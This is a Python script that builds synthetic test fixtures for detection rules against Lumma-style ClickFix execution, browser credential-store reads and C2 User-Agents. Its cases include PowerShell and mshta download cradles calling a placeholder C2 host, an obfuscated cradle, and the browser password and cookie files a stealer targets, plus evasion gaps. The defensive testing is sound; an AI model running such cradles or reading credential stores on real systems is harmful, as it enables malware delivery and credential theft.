"""Builds tests/fixtures/logs/*.jsonl from the compact definitions below.

Run `python tests/fixtures/build_cases.py` after editing a case. test_sigma_rules.py checks that the
committed JSONL equals what this script produces, so the two cannot drift apart.

Every value is synthetic. The Base64 payload is the UTF-16LE encoding of a harmless text string.
Addresses use RFC 5737 ranges. Domains use ".example". No sample, real log or real indicator is used.

Case schema (blueprint section 4):
  id, group, category, technique, description, log_format, raw, expected_fields, expected_detected
"""
import base64
import json
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
from logparse import build_proxy  # noqa: E402
from winevent import build_security4663, build_sysmon1  # noqa: E402

LOG_DIR = HERE / "logs"
B64 = base64.b64encode("Write-Output 'synthetic fixture 001'".encode("utf-16-le")).decode()

PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
PWSH = r"C:\Program Files\PowerShell\7\pwsh.exe"
MSHTA = r"C:\Windows\System32\mshta.exe"
EXPLORER = r"C:\Windows\explorer.exe"


def _case(case_id, group, category, technique, description, raw, expected_fields, expected_detected, log_format="windows_event_xml"):
    return {
        "id": case_id, "group": group, "category": category, "technique": technique,
        "description": description, "log_format": log_format, "raw": raw,
        "expected_fields": expected_fields, "expected_detected": expected_detected,
    }


def r1(case_id, category, description, parent, image, cmd, detected, technique="T1204 / T1059.001", orig=None):
    fields = {"ParentImage": parent, "Image": image, "CommandLine": cmd}
    if orig:
        fields["OriginalFileName"] = orig
    raw = build_sysmon1(**fields)
    return _case(case_id, "re_lumma_001", category, technique, description, raw,
                 {"ParentImage": parent, "Image": image, "CommandLine": cmd, "EventID": "1"}, detected)


def r2(case_id, category, description, process, obj, detected, event_id=4663, technique="T1555.003 / T1539"):
    raw = build_security4663(event_id=event_id, ObjectName=obj, ProcessName=process)
    return _case(case_id, "re_lumma_002", category, technique, description, raw,
                 {"ProcessName": process, "ObjectName": obj, "EventID": str(event_id)}, detected)


def rule001_cases():
    u = r"C:\Users\user01"
    cases = [
        # --- ClickFix, encoded PowerShell (parent explorer.exe, as the Run dialog starts it) ---
        r1("R1-P01", "clickfix-encoded", "Run dialog paste, -enc with hidden window", EXPLORER, PS, f"powershell -w hidden -nop -enc {B64}", True),
        r1("R1-P02", "clickfix-encoded", "Abbreviation -e", EXPLORER, PS, f"powershell -e {B64}", True),
        r1("R1-P03", "clickfix-encoded", "Full -EncodedCommand", EXPLORER, PS, f"powershell -NoProfile -EncodedCommand {B64}", True),
        r1("R1-P04", "clickfix-encoded", "pwsh with -ec", EXPLORER, PWSH, f"pwsh -ec {B64}", True),
        r1("R1-P05", "clickfix-encoded", "Abbreviation -enco", EXPLORER, PS, f"powershell -enco {B64}", True),
        r1("R1-P06", "clickfix-encoded", "Upper-case paths and flags (case-insensitive match)", r"C:\WINDOWS\EXPLORER.EXE",
           r"C:\WINDOWS\SYSTEM32\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE", f"POWERSHELL -ENC {B64}", True),
        # --- ClickFix, download cradle ---
        r1("R1-P07", "clickfix-cradle", "iex with irm against a URL", EXPLORER, PS,
           'powershell -nop -w hidden -c "iex (irm https://c2-placeholder.example/v.ps1)"', True),
        r1("R1-P08", "clickfix-cradle", "WebClient DownloadString piped to iex", EXPLORER, PS,
           "powershell -c \"(New-Object Net.WebClient).DownloadString('https://c2-placeholder.example/a')|iex\"", True),
        # --- ClickFix, mshta fetching remote content ---
        r1("R1-P09", "clickfix-mshta", "mshta against an https URL", EXPLORER, MSHTA,
           "mshta https://c2-placeholder.example/verify.hta", True, technique="T1204 / T1218.005"),
        r1("R1-P10", "clickfix-mshta", "mshta against an http URL on a reserved address", EXPLORER, MSHTA,
           "mshta http://198.51.100.7/c.hta", True, technique="T1204 / T1218.005"),
        # --- Benign near-misses ---
        r1("R1-N01", "benign-near-miss", "Scheduled task host runs an approved encoded script (same command as P01)",
           r"C:\Windows\System32\svchost.exe", PS, f"powershell -w hidden -nop -enc {B64}", False),
        r1("R1-N02", "benign-near-miss", "Software deployment agent runs an encoded script",
           r"C:\Windows\CCM\CcmExec.exe", PS, f"powershell -ExecutionPolicy Bypass -enc {B64}", False),
        r1("R1-N03", "benign-near-miss", "Admin runs a cradle from a terminal, not from explorer.exe",
           r"C:\Program Files\WindowsApps\Microsoft.WindowsTerminal\WindowsTerminal.exe", PS,
           'powershell -NoProfile -c "iex (irm https://intranet.example/tool.ps1)"', False),
        r1("R1-N04", "benign-near-miss", "Legacy launcher starts mshta on an intranet URL",
           r"C:\Program Files\Legacy\launcher.exe", MSHTA, "mshta https://intranet.example/app.hta", False),
        r1("R1-N05", "benign-near-miss", "explorer starts PowerShell on a script file", EXPLORER, PS,
           r"powershell -ExecutionPolicy Bypass -File C:\Tools\inventory.ps1", False),
        r1("R1-N06", "benign-near-miss", "explorer starts PowerShell with a plain command", EXPLORER, PS,
           'powershell -NoProfile -Command "Get-Process | Sort-Object CPU"', False),
        r1("R1-N07", "benign-near-miss", "URL plus the word iexplore must not count as the iex cradle", EXPLORER, PS,
           'powershell -c "Start-Process iexplore https://intranet.example/help"', False),
        r1("R1-N08", "benign-near-miss", "mshta on a local file", EXPLORER, MSHTA,
           r'mshta "C:\Program Files\Legacy\app.hta"', False, technique="T1218.005"),
        r1("R1-N09", "benign-near-miss", "Browser started with a URL (URL present, image not PowerShell or mshta)", EXPLORER,
           r"C:\Program Files\Google\Chrome\Application\chrome.exe", "chrome.exe https://example.test/", False),
        r1("R1-N10", "benign-near-miss", "URL in a string, no download cradle", EXPLORER, PS,
           "powershell -NoProfile -c \"Write-Host 'https://intranet.example/status'\"", False),
        # --- Documented gaps: the rule does not see these. See re_lumma_001 header, SOURCE LIMITS. ---
        r1("R1-G01", "documented-gap", "cmd.exe is the child of explorer, so the PowerShell comes later with a cmd parent",
           EXPLORER, r"C:\Windows\System32\cmd.exe", f"cmd /c start /min powershell -w hidden -enc {B64}", False),
        r1("R1-G02", "documented-gap", "The PowerShell child of cmd.exe has a non-explorer parent",
           r"C:\Windows\System32\cmd.exe", PS, f"powershell -w hidden -enc {B64}", False),
        r1("R1-G03", "documented-gap", "Renamed copy of powershell.exe", EXPLORER, rf"{u}\Public\ps-copy.exe",
           f"ps-copy.exe -enc {B64}", False, orig="PowerShell.EXE"),
        r1("R1-G04", "documented-gap", "Truncated command line: Base64 cut below the 16-character floor", EXPLORER, PS,
           "powershell -w hidden -enc SQBFAFgAIAAo", False),
        r1("R1-G05", "documented-gap", "Cradle assembled from string pieces defeats keyword matching", EXPLORER, PS,
           "powershell -c \"$u='https://c2-placeholder.example/a'; &('i'+'e'+'x') ((New-Object ('Net.Web'+'Client')).('Download'+'String')($u))\"",
           False),
    ]
    return cases


def rule002_cases():
    u = r"C:\Users\user01"
    chrome_dir = rf"{u}\AppData\Local\Google\Chrome\User Data\Default"
    edge_dir = rf"{u}\AppData\Local\Microsoft\Edge\User Data"
    brave_dir = rf"{u}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default"
    ff_dir = rf"{u}\AppData\Roaming\Mozilla\Firefox\Profiles\ab12cd34.default-release"
    stealer = rf"{u}\AppData\Local\Temp\a1b2c3.exe"
    chrome_pf = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
    return [
        # --- Positives: non-browser process opens a store file ---
        r2("R2-P01", "browser-store-read", "Unknown executable reads Chrome Login Data", stealer, rf"{chrome_dir}\Login Data", True),
        r2("R2-P02", "browser-store-read", "Unknown executable reads Chrome Network\\Cookies", stealer, rf"{chrome_dir}\Network\Cookies", True),
        r2("R2-P03", "browser-store-read", "Unknown executable reads Edge Local State (holds the key)", stealer, rf"{edge_dir}\Local State", True),
        r2("R2-P04", "browser-store-read", "Unknown executable reads Edge Login Data For Account", stealer, rf"{edge_dir}\Default\Login Data For Account", True),
        r2("R2-P05", "browser-store-read", "Unknown executable reads Brave Web Data", stealer, rf"{brave_dir}\Web Data", True),
        r2("R2-P06", "browser-store-read", "Unknown executable reads Firefox logins.json", stealer, rf"{ff_dir}\logins.json", True),
        r2("R2-P07", "browser-store-read", "Unknown executable reads Firefox key4.db", stealer, rf"{ff_dir}\key4.db", True),
        r2("R2-P08", "browser-store-read", "Unknown executable reads Firefox cookies.sqlite", stealer, rf"{ff_dir}\cookies.sqlite", True),
        r2("R2-P09", "browser-store-read", "PowerShell reads Chrome Login Data", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
           rf"{chrome_dir}\Login Data", True),
        # --- Benign near-misses ---
        r2("R2-N01", "benign-near-miss", "Chrome (Program Files) reads its own Login Data", chrome_pf, rf"{chrome_dir}\Login Data", False),
        r2("R2-N02", "benign-near-miss", "Chrome (per-user install) reads its own Cookies",
           rf"{u}\AppData\Local\Google\Chrome\Application\chrome.exe", rf"{chrome_dir}\Network\Cookies", False),
        r2("R2-N03", "benign-near-miss", "Edge reads its own Cookies", r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
           rf"{edge_dir}\Default\Network\Cookies", False),
        r2("R2-N04", "benign-near-miss", "Firefox reads its own key4.db", r"C:\Program Files\Mozilla Firefox\firefox.exe", rf"{ff_dir}\key4.db", False),
        r2("R2-N05", "benign-near-miss", "Chrome updater reads Local State", r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe",
           rf"{chrome_dir.rsplit(chr(92), 1)[0]}\Local State", False),
        r2("R2-N06", "benign-near-miss", "Edge updater reads Local State", r"C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe",
           rf"{edge_dir}\Local State", False),
        r2("R2-N07", "benign-near-miss", "Brave reads its own Web Data", r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
           rf"{brave_dir}\Web Data", False),
        r2("R2-N08", "benign-near-miss", "Non-browser reads a non-store file in the profile", stealer, rf"{chrome_dir}\Preferences", False),
        r2("R2-N09", "benign-near-miss", "Non-browser reads a file named Login Data outside any profile folder", stealer, r"C:\Temp\Login Data", False),
        r2("R2-N10", "benign-near-miss", "Same as P01 but event 4656, not 4663", stealer, rf"{chrome_dir}\Login Data", False, event_id=4656),
        # --- Known false positive that needs local tuning ---
        r2("R2-K01", "known-fp-needs-tuning", "Backup software reads Login Data. The rule alerts; the deployer tunes it.",
           r"C:\Program Files\Vendor Backup\backup.exe", rf"{chrome_dir}\Login Data", True),
        # --- Documented gaps ---
        r2("R2-G01", "documented-gap", "Stealer running inside the chrome.exe process: the process name is the browser", chrome_pf,
           rf"{chrome_dir}\Login Data", False),
        r2("R2-G02", "documented-gap", "Path-suffix spoof: a copy placed where the filter's suffix matches",
           rf"{u}\Public\Google\Chrome\Application\chrome.exe", rf"{chrome_dir}\Login Data", False),
        r2("R2-G03", "documented-gap", "Opera keeps its profile outside a User Data folder",
           stealer, rf"{u}\AppData\Roaming\Opera Software\Opera Stable\Login Data", False),
    ]


# The two User-Agent strings ESET lists in Table 2 (matched exactly against the raw page on 2026-11-22).
UA_CHROME_119 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
UA_CHROME_109 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
# A newer Chrome version. The number is illustrative; it is not a claim about the current release.
UA_CHROME_NEWER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"


def r3(case_id, category, description, method, ua, detected, host="c2-placeholder.example", uri="/api", status="200"):
    raw = build_proxy(**{"cs-method": method, "c-useragent": ua, "cs-host": host, "cs-uri-stem": uri, "sc-status": status})
    return _case(case_id, "re_lumma_003", category, "T1071.001", description, raw,
                 {"cs-method": method, "c-useragent": ua, "LogType": "proxy"}, detected, log_format="proxy_json")


def rule003_cases():
    return [
        r3("R3-P01", "c2-useragent", "POST with ESET's 'Old' User-Agent (Chrome/119) to a synthetic C2 host", "POST", UA_CHROME_119, True),
        r3("R3-P02", "c2-useragent", "POST with ESET's 'New' User-Agent (Chrome/109) to a synthetic C2 host", "POST", UA_CHROME_109, True),
        r3("R3-N01", "benign-near-miss", "Benign POST with a newer Chrome version (not one of the two strings)", "POST", UA_CHROME_NEWER, False,
           host="app.example", uri="/login"),
        r3("R3-N02", "benign-near-miss", "GET with the Chrome/119 string: the rule requires POST", "GET", UA_CHROME_119, False,
           host="www.example", uri="/index.html"),
        r3("R3-K01", "known-fp-needs-tuning", "Legitimate user on an old Chrome/109 build POSTs a web form. The rule alerts; there is no baseline to tune against.",
           "POST", UA_CHROME_109, True, host="intranet.example", uri="/forms/submit"),
        r3("R3-G01", "documented-gap", "Un-inspected HTTPS: the proxy logs a CONNECT with no User-Agent, so the rule is blind",
           "CONNECT", "-", False, uri="-"),
    ]


def build_all():
    return {"rule001_cases.jsonl": rule001_cases(), "rule002_cases.jsonl": rule002_cases(), "rule003_cases.jsonl": rule003_cases()}


def main():
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    for name, cases in build_all().items():
        ids = [c["id"] for c in cases]
        assert len(ids) == len(set(ids)), f"duplicate case ids in {name}"
        (LOG_DIR / name).write_text("".join(json.dumps(c, sort_keys=True) + "\n" for c in cases), encoding="utf-8", newline="\n")
        print(f"wrote {name}: {len(cases)} cases")


if __name__ == "__main__":
    main()
